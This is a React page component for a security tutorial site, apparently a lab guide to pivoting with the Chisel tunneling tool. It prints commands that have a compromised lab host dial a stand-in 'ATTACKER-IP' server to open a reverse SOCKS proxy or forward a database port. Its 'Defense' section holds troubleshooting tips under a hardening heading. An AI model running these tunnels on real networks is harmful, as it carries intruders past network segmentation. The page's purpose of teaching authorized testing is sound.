import { Helmet } from 'react-helmet-async'
import ToolLayout from '../components/ToolLayout'

function Section({ id, icon, title, subtitle, children }) {
  return (
    <section id={id} className="glass p-6 sm:p-7 mb-6 scroll-mt-24">
      <div className="flex items-center gap-3 mb-1">
        <span className="text-xl">{icon}</span>
        <h2 className="text-lg sm:text-xl font-extrabold text-white m-0">{title}</h2>
      </div>
      {subtitle && <p className="text-xs text-slate-400 mt-1 mb-4">{subtitle}</p>}
      {!subtitle && <div className="mb-2" />}
      <div className="space-y-4 text-sm text-slate-300 leading-relaxed">{children}</div>
    </section>
  )
}

function CodeBlock({ title, lines }) {
  return (
    <div className="rounded-xl overflow-hidden border border-white/10" style={{ background: '#0a0f1e' }}>
      <div className="flex items-center gap-2 px-4 py-2 border-b border-white/10" style={{ background: '#111827' }}>
        <span className="w-2.5 h-2.5 rounded-full bg-red-500/80" />
        <span className="w-2.5 h-2.5 rounded-full bg-yellow-500/80" />
        <span className="w-2.5 h-2.5 rounded-full bg-green-500/80" />
        {title && <span className="ml-2 text-[11px] font-mono text-slate-400">{title}</span>}
      </div>
      <pre className="p-4 overflow-x-auto text-[13px] leading-relaxed font-mono text-green-300 whitespace-pre-wrap">
{lines}
      </pre>
    </div>
  )
}

function WarningBox({ children }) {
  return (
    <div className="rounded-xl p-4 border border-red-500/30 mb-6" style={{ background: 'rgba(239,68,68,0.07)' }}>
      <div className="flex items-center gap-2 text-red-300 font-bold text-sm mb-1.5">⚠️ Legal &amp; Ethical Warning</div>
      <div className="text-xs text-red-200/80 leading-relaxed">{children}</div>
    </div>
  )
}

function InfoBox({ title, icon = '💡', children }) {
  return (
    <div className="rounded-xl p-4 border border-cyan-500/25" style={{ background: 'rgba(6,182,212,0.06)' }}>
      <div className="flex items-center gap-2 text-cyan-300 font-bold text-sm mb-1.5">{icon} {title}</div>
      <div className="text-xs text-slate-300 leading-relaxed">{children}</div>
    </div>
  )
}

function FeatureGrid({ items }) {
  return (
    <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
      {items.map(f => (
        <div key={f.t} className="rounded-xl p-4 border border-white/8" style={{ background: 'rgba(0,0,0,0.3)' }}>
          <div className="text-2xl mb-1">{f.i}</div>
          <div className="text-sm font-semibold text-white mb-0.5">{f.t}</div>
          <div className="text-xs text-slate-400">{f.d}</div>
        </div>
      ))}
    </div>
  )
}

function IssueRow({ issue, fix }) {
  return (
    <div className="rounded-xl p-4 border border-white/8" style={{ background: 'rgba(0,0,0,0.3)' }}>
      <div className="flex items-start gap-2">
        <span className="text-red-400 font-bold mt-0.5">✕</span>
        <div className="min-w-0">
          <div className="text-sm font-semibold text-white mb-1">{issue}</div>
          <div className="text-xs text-slate-400 leading-relaxed">
            <span className="text-green-400 font-semibold">Fix: </span>{fix}
          </div>
        </div>
      </div>
    </div>
  )
}

const faq = [
  { q: "What is Chisel?", a: "Chisel is a free, open-source tunneling tool in Go by JPillora. Static binaries on each side build encrypted TCP/UDP tunnels over HTTP, with reverse forwarding and SOCKS modes for pivoting." },
  { q: "Is using Chisel legal?", a: "Chisel itself is legitimate open-source software. Tunneling on networks without explicit written permission is illegal, and pivoting outside a signed scope can void an authorization. Use it only in isolated labs or explicitly scoped engagements." },
  { q: "How do I install Chisel?", a: "Download matching static release binaries for both ends from the GitHub releases page and chmod +x. No dependencies or installation needed." },
  { q: "How do I pivot through a lab host?", a: "Run chisel server with --reverse on the attacker VM, then chisel client with R:socks from the in-scope lab host. Route tools through the SOCKS port, scoped to signed ranges." },
  { q: "What is the difference between Chisel and SSH forwarding?", a: "SSH needs credentials and a server on the target. Chisel needs one static binary, speaks HTTP-friendly egress, multiplexes many ports over one connection, and adds SOCKS plus auth out of the box." },
  { q: "How do I forward one service only?", a: "Use R:localport:127.0.0.1:remoteport from the lab host instead of full SOCKS. Narrow forwards honor least-access scoping." },
  { q: "Why is tunneled scanning slow?", a: "One multiplexed connection carries everything. Reduce concurrency, prefer single forwards, and save bulk scans for direct access." },
  { q: "How do I clean up afterward?", a: "Kill chisel on both ends, verify listening ports closed, and confirm no forwards remain. Document every tunnel's lifetime in the report." }
]

const howItWorks = [
  "Fetch matching Chisel binaries for attacker VM and lab host.",
  "Confirm tunneling is explicitly inside the signed engagement scope.",
  "Start the server with --reverse and auth, then dial home from the lab host.",
  "Pivot with SOCKS or narrow forwards, staying strictly inside scope.",
  "Tear down every tunnel, verify ports closed, and log the session."
]

const schema = {
  '@context': 'https://schema.org',
  '@graph': [
    {
      '@type': 'TechArticle',
      headline: 'Chisel Fast TCP Tunnel — Lab Pivoting & Port Forwarding Guide',
      description: 'Step-by-step reference: pivot through lab networks with Chisel encrypted tunnels. Lab only.',
      about: 'Chisel encrypted TCP UDP tunneling',
      educationalUse: 'Testing, education, and authorized research only',
    },
    {
      '@type': 'FAQPage',
      mainEntity: faq.map(f => ({
        '@type': 'Question',
        name: f.q,
        acceptedAnswer: { '@type': 'Answer', text: f.a },
      })),
    },
  ],
}

export default function hackolution_chisel() {
  return (
    <ToolLayout
      title="Chisel Fast TCP Tunnel"
      desc="Step-by-step reference: pivot through lab networks with Chisel encrypted tunnels. Lab only."
      icon="🚇"
      iconBg="linear-gradient(135deg, rgba(6,182,212,0.18), rgba(27,255,110,0.08))"
      category="security"
      slug="hackolution/chisel"
      faq={faq}
      howItWorks={howItWorks}
      schema={schema}
    >
      <Helmet>
        <meta name="robots" content="index, follow" />
      </Helmet>

      <Section id="video" icon="🎬" title="HACKOLUTION reel" subtitle="Watch on Instagram, then practice below in your lab">
        <div className="max-w-3xl mx-auto">
          <div className="rounded-xl overflow-hidden border border-white/10 p-8 text-center" style={{ background: 'linear-gradient(135deg, rgba(214,41,118,0.12), rgba(17,24,39,0.6))' }}>
            <div className="text-4xl mb-3">📸</div>
            <h3 className="text-lg font-bold text-white mb-2">Watch the Chisel Reel on Instagram</h3>
            <p className="text-xs text-slate-400 mb-5 max-w-md mx-auto">
              Check out the HACKOLUTION reel for pivoting basics, reverse tunnels, and egress rules that contain them.
            </p>
            <div className="flex gap-2 flex-wrap justify-center">
              <a href="https://www.instagram.com/hackolution" target="_blank" rel="noopener noreferrer"
                className="inline-flex items-center gap-1.5 px-4 py-2 rounded-xl text-sm font-bold no-underline"
                style={{ background: 'linear-gradient(92deg, #feda75, #fa7e1e, #d62976, #962fbf, #4f5bd5)', color: '#fff' }}>📸 Watch on Instagram @hackolution</a>
              <a href="https://www.youtube.com/@hncker" target="_blank" rel="noopener noreferrer"
                className="inline-flex items-center gap-1.5 px-4 py-2 rounded-xl text-sm font-bold no-underline bg-white/5 border border-white/10 text-slate-200 hover:text-white transition-all">▶ YouTube Channel</a>
            </div>
          </div>
        </div>
      </Section>

      <WarningBox>
        Chisel creates encrypted tunnels that bypass network segmentation. Deploying tunnels on any network without explicit written permission is strictly prohibited and illegal — it can constitute unauthorized access even in otherwise authorized tests if pivoting is out of scope. Use Chisel <b>only in isolated labs or engagements where tunneling is explicitly in the signed scope</b>. Log every tunnel and tear them all down afterward.
      </WarningBox>

      <Section id="overview" icon="🚇" title="What is Chisel?" subtitle="Fast encrypted tunnels over HTTP, by JPillora">
        <p>
          <b>Chisel</b> is a free, open-source <b>tunneling tool</b> written in <b>Go</b> by JPillora. One static binary on each side builds an <b>encrypted TCP (and UDP) tunnel over HTTP</b> — forwarding ports, exposing internal lab services, and pivoting through a compromised lab host with no dependencies.
        </p>
        <p>
          Its killer feature is reverse port forwarding through restrictive egress: when the lab target can only reach out over HTTP, Chisel dials home and brings the internal network with it. Paired with SOCKS mode, the whole lab subnet becomes reachable from the attacker machine for authorized follow-up scanning.
        </p>
        <FeatureGrid items={[
          { i: '🔒', t: 'Encrypted Transport', d: 'TLS-wrapped tunnels with optional authentication.' },
          { i: '🔁', t: 'Reverse Forwarding', d: 'Exfiltrate-style egress that dials out through HTTP.' },
          { i: '🧦', t: 'SOCKS Proxy Mode', d: 'Route full toolsets through one tunnel endpoint.' },
          { i: '📦', t: 'Static Binaries', d: 'No dependencies — drop and run on lab targets.' },
          { i: '⚡', t: 'Multiplexed Streams', d: 'Many forwarded ports over a single connection.' },
          { i: '🔑', t: 'Auth & Fingerprint', d: 'Shared secrets plus server fingerprints for lab safety.' }
        ]} />
      </Section>

      <Section id="installation" icon="🛠️" title="Installation" subtitle="Install Chisel on Linux">
        <p className="text-xs text-slate-400">Download the static release binaries for both ends of the lab tunnel:</p>
        <CodeBlock title="terminal" lines={`# attacker machine + lab host: fetch matching release
# https://github.com/jpillora/chisel/releases
chmod +x chisel`} />
        <InfoBox title="Matching versions matter">
          Server and client should run the same Chisel release — protocol mismatches fail cryptically. Keep the binary out of production systems; lab machines and dedicated attacker VMs only.
        </InfoBox>
      </Section>

      <Section id="command1" icon="🚀" title="Command 1 — Reverse SOCKS Pivot" subtitle="Reach the lab subnet through one host">
        <p className="text-xs text-slate-400">Start the server on your attacker VM, then dial home from the lab host:</p>
        <CodeBlock title="terminal" lines={`# attacker VM:
./chisel server -p 8000 --reverse
# lab host (in-scope only):
# ./chisel client ATTACKER-IP:8000 R:socks`} />
        <InfoBox title="Using the SOCKS proxy">
          Pointproxychains or browser tooling at the SOCKS port Chisel opens. Every in-scope lab subnet address becomes scannable from the attacker VM — restrict tool configs to the signed scope so the tunnel never wanders.
        </InfoBox>
      </Section>

      <Section id="command2" icon="🎯" title="Command 2 — Remote Port Forward" subtitle="Expose one internal lab service">
        <p className="text-xs text-slate-400">Bring a single internal lab port back to the attacker machine:</p>
        <CodeBlock title="terminal" lines={`# attacker VM:
./chisel server -p 8000 --reverse
# lab host:
# ./chisel client ATTACKER-IP:8000 R:3306:127.0.0.1:3306`} />
        <InfoBox title="Single-service exposure">
          Local port 3306 on the attacker VM now reaches the lab database. Prefer narrow forwards over full SOCKS when the scope names one service — least access applies to tunnels too.
        </InfoBox>
      </Section>

      <Section id="command3" icon="📄" title="Command 3 — Authenticated Tunnel" subtitle="Lock tunnels with secrets">
        <p className="text-xs text-slate-400">Run the tunnel with a shared secret and fingerprint checks:</p>
        <CodeBlock title="terminal" lines={`./chisel server -p 8000 --reverse --auth labuser:labpass123
# client adds the same credentials:
# ./chisel client --auth labuser:labpass123 ATTACKER-IP:8000 R:socks`} />
        <InfoBox title="Tunnel hygiene">
          Authentication stops strangers from riding an exposed Chisel server. Use long random secrets per engagement, bind the server to the lab interface only, and kill every tunnel process when the session ends.
        </InfoBox>
      </Section>

      <Section id="screenshots" icon="🖼️" title="Screenshots" subtitle="Chisel tunnel carrying lab traffic">
        <figure className="rounded-xl overflow-hidden border border-white/10" style={{ background: 'rgba(0,0,0,0.3)' }}>
          <img src="/assets/tools/chisel/chisel_logo.jpg" alt="Chisel fast TCP tunnel logo" width="1200" height="630"
            className="w-full h-auto object-contain" loading="lazy" />
          <figcaption className="px-4 py-2 text-xs text-slate-400">Chisel reverse tunnel — lab subnet reachable via SOCKS</figcaption>
        </figure>
      </Section>

      <Section id="findings" icon="🔍" title="What Chisel Tunnels Enable" subtitle="Authorized lab pivoting outcomes">
        <FeatureGrid items={[
          { i: '🗺️', t: 'Subnet Visibility', d: 'Scan internal lab ranges from the attacker VM.' },
          { i: '🗄️', t: 'Service Access', d: 'Reach databases and admin panels behind the foothold.' },
          { i: '🔁', t: 'Egress Proofs', d: 'Demonstrate HTTP-only exfiltration paths for the report.' },
          { i: '🧦', t: 'Tool Routing', d: 'Run Nmap and web tools through the SOCKS endpoint.' },
          { i: '📦', t: 'Clean Transfers', d: 'Move lab tooling across the tunnel without new services.' },
          { i: '🧹', t: 'Contained Sessions', d: 'Scoped forwards that tear down completely afterward.' }
        ]} />
      </Section>

      <Section id="defense" icon="🛡️" title="Defense — Hardening for Site Owners" subtitle="Remediation steps to reduce exposure">
        <div className="space-y-3">
          <IssueRow
            issue="Client cannot reach the server"
            fix="Confirm the attacker VM port is open on the lab firewall and the address is correct. Test with curl to the server port before debugging Chisel itself."
          />
          <IssueRow
            issue="Version mismatch errors"
            fix="Run identical Chisel releases on both ends. Mixed versions fail with unclear handshake errors — re-download matching binaries."
          />
          <IssueRow
            issue="Tunnel is painfully slow"
            fix="Reduce concurrent scans through SOCKS and prefer narrow forwards. Tunnels multiplex over one connection, so bulk scanning saturates them fast."
          />
          <IssueRow
            issue="Tunnel left running after the lab"
            fix="List processes and kill every chisel instance on both ends, then verify ports closed. Leftover tunnels are findings against you — always tear down."
          />
        </div>
      </Section>

      <Section id="flags" icon="🏷️" title="Key Chisel Flags & Options" subtitle="Essential command-line switches">
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
          <div key="k0" className="rounded-xl p-4 border border-white/8" style={{ background: 'rgba(0,0,0,0.3)' }}>
            <div className="text-sm font-semibold text-green-300 font-mono mb-1">server -p &lt;port&gt;</div>
            <div className="text-xs text-slate-400">Listen for tunnel clients on the given port.</div>
          </div>
          <div key="k1" className="rounded-xl p-4 border border-white/8" style={{ background: 'rgba(0,0,0,0.3)' }}>
            <div className="text-sm font-semibold text-green-300 font-mono mb-1">client &lt;server&gt;</div>
            <div className="text-xs text-slate-400">Dial home to the Chisel server address.</div>
          </div>
          <div key="k2" className="rounded-xl p-4 border border-white/8" style={{ background: 'rgba(0,0,0,0.3)' }}>
            <div className="text-sm font-semibold text-green-300 font-mono mb-1">R:socks / R:port:host:port</div>
            <div className="text-xs text-slate-400">Reverse SOCKS proxy or single-port forward.</div>
          </div>
          <div key="k3" className="rounded-xl p-4 border border-white/8" style={{ background: 'rgba(0,0,0,0.3)' }}>
            <div className="text-sm font-semibold text-green-300 font-mono mb-1">--reverse</div>
            <div className="text-xs text-slate-400">Allow clients to request reverse forwards.</div>
          </div>
          <div key="k4" className="rounded-xl p-4 border border-white/8" style={{ background: 'rgba(0,0,0,0.3)' }}>
            <div className="text-sm font-semibold text-green-300 font-mono mb-1">--auth user:pass</div>
            <div className="text-xs text-slate-400">Shared secret locking the tunnel endpoints.</div>
          </div>
          <div key="k5" className="rounded-xl p-4 border border-white/8" style={{ background: 'rgba(0,0,0,0.3)' }}>
            <div className="text-sm font-semibold text-green-300 font-mono mb-1">--tls / fingerprint</div>
            <div className="text-xs text-slate-400">Encrypted transport with server identity checks.</div>
          </div>
        </div>
      </Section>

      <Section id="resources" icon="🔗" title="Resources" subtitle="Official links &amp; social">
        <div className="space-y-2">
          {[
            ['📦', 'Official Chisel GitHub Repository', 'https://github.com/jpillora/chisel'],
            ['📖', 'Chisel Usage Documentation', 'https://github.com/jpillora/chisel#usage'],
            ['📸', 'HACKOLUTION Instagram', 'https://www.instagram.com/hackolution']
          ].map(([i, label, href]) => (
            <a key={href} href={href} target="_blank" rel="noopener noreferrer"
              className="flex items-center gap-2 rounded-lg px-3 py-2 border border-white/8 hover:border-brand/40 hover:bg-white/5 transition-all text-slate-300 hover:text-white no-underline">
              <span>{i}</span>
              <span className="text-sm font-medium">{label}</span>
              <span className="ml-auto text-indigo-300 text-xs font-mono break-all">{href}</span>
            </a>
          ))}
        </div>
      </Section>
    </ToolLayout>
  )
}
